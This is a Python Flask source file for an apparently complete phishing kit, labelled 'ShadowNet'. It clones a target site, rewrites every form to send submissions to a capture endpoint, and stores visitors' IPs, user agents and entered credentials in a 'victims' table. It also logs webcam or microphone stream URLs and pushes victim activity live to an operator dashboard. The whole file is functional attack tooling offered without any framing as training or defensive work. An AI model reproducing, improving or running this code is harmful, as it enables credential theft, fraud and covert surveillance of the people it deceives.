from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory
from flask_socketio import SocketIO, emit
import requests
from bs4 import BeautifulSoup
import sqlite3
import uuid
import os
import re
from urllib.parse import urljoin, urlparse
from config import Config
from datetime import datetime

app = Flask(__name__)
app.config.from_object(Config)
socketio = SocketIO(app, cors_allowed_origins="*")

# Ensure directories exist
os.makedirs('templates', exist_ok=True)
os.makedirs('static/cloned_assets', exist_ok=True)
os.makedirs('static/css', exist_ok=True)
os.makedirs('static/js', exist_ok=True)

def init_db():
    conn = sqlite3.connect(app.config['DATABASE'])
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS victims
                      (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, credentials TEXT, cookies TEXT, campaign_id TEXT, timestamp TEXT, media_access TEXT)''')
    conn.commit()
    conn.close()

def download_and_replace_asset(soup, tag, attr, base_domain, campaign_id):
    for item in soup.find_all(tag):
        if item.get(attr):
            original_url = item[attr]
            # Skip data URLs and already absolute URLs from other domains
            if original_url.startswith('data:') or urlparse(original_url).netloc:
                continue
            
            absolute_url = urljoin(base_domain, original_url)
            try:
                response = requests.get(absolute_url, timeout=5)
                if response.status_code == 200:
                    # Create a safe filename
                    filename = re.sub(r'[^a-zA-Z0-9_.-]', '_', urlparse(absolute_url).path.split('/')[-1])
                    if not filename:
                        filename = f"asset_{uuid.uuid4().hex[:8]}.{attr}"
                    
                    asset_dir = f'static/cloned_assets/{campaign_id}'
                    os.makedirs(asset_dir, exist_ok=True)
                    asset_path = os.path.join(asset_dir, filename)
                    
                    with open(asset_path, 'wb') as f:
                        f.write(response.content)
                    
                    # Replace the URL with our local server URL
                    item[attr] = urljoin(f'http://{request.host}/static/cloned_assets/', f'{campaign_id}/{filename}')
            except Exception as e:
                print(f"Failed to download {attr} {absolute_url}: {e}")

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/create', methods=['POST'])
def create_phish():
    try:
        target_url = request.form.get('target_url', '')
        if not target_url:
            return jsonify({'success': False, 'error': 'No URL provided'}), 400

        response = requests.get(target_url, timeout=10)
        response.raise_for_status()
        
        soup = BeautifulSoup(response.text, 'html.parser')
        campaign_id = str(uuid.uuid4())
        
        # Get the base domain for resolving relative URLs
        base_domain = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
        
        # Download and replace images, scripts, and stylesheets
        download_and_replace_asset(soup, 'img', 'src', base_domain, campaign_id)
        download_and_replace_asset(soup, 'link', 'href', base_domain, campaign_id)
        download_and_replace_asset(soup, 'script', 'src', base_domain, campaign_id)
        
        # Modify forms
        for form in soup.find_all('form'):
            form['action'] = f'/capture?campaign_id={campaign_id}'
            form['method'] = 'POST'
        
        # Save the modified HTML
        file_path = f'templates/phish_{campaign_id}.html'
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(str(soup))
        
        return jsonify({'success': True, 'url': f'/phish/{campaign_id}', 'campaign_id': campaign_id})

    except Exception as e:
        return jsonify({'success': False, 'error': f'Internal error: {str(e)}'}), 500

@app.route('/phish/<campaign_id>')
def serve_phish(campaign_id):
    return render_template('phish_page.html', campaign_id=campaign_id, host=request.host)

@app.route('/get_phishing_page/<campaign_id>')
def get_phishing_page(campaign_id):
    file_path = f'templates/phish_{campaign_id}.html'
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            return f.read()
    return "Page not found", 404

@app.route('/capture', methods=['POST'])
def capture():
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    credentials = request.form.to_dict()
    campaign_id = request.args.get('campaign_id', '')
    
    if not campaign_id:
        return jsonify({'error': 'No campaign ID'}), 400

    victim_id = str(uuid.uuid4())
    timestamp = datetime.now().isoformat()
    
    conn = sqlite3.connect(app.config['DATABASE'])
    cursor = conn.cursor()
    
    credentials_str = str(credentials)
    cursor.execute("INSERT INTO victims VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                   (victim_id, ip, user_agent, credentials_str, "", campaign_id, timestamp, ""))
    conn.commit()
    conn.close()
    
    return redirect('https://www.google.com')

@app.route('/media_access', methods=['POST'])
def media_access():
    data = request.json
    campaign_id = data.get('campaign_id')
    media_stream_url = data.get('media_stream_url')
    
    if not campaign_id or not media_stream_url:
        return jsonify({'success': False, 'error': 'Missing data'}), 400
    
    # Update the database with media access info
    conn = sqlite3.connect(app.config['DATABASE'])
    cursor = conn.cursor()
    cursor.execute("UPDATE victims SET media_access=? WHERE campaign_id=?", 
                   (media_stream_url, campaign_id))
    conn.commit()
    conn.close()
    
    # Emit to dashboard that media access has been granted
    socketio.emit('media_access_granted', {
        'campaign_id': campaign_id,
        'media_stream_url': media_stream_url,
        'timestamp': datetime.now().isoformat()
    }, broadcast=True)
    
    return jsonify({'success': True})

@app.route('/static/cloned_assets/<path:filename>')
def serve_cloned_asset(filename):
    return send_from_directory('static/cloned_assets', filename)

@socketio.on('connect')
def handle_connect():
    emit('status', {'msg': 'Connected to ShadowNet'})

@socketio.on('victim_activity')
def handle_victim_activity(data):
    print(f"Received activity: {data}")
    emit('update', data, broadcast=True)

@socketio.on('permission_granted')
def handle_permission_granted(data):
    print(f"Permission data: {data}")
    emit('permission_update', data, broadcast=True)

if __name__ == '__main__':
    init_db()
    socketio.run(app, debug=True, host=app.config['HOST'], port=app.config['PORT'], use_reloader=False)
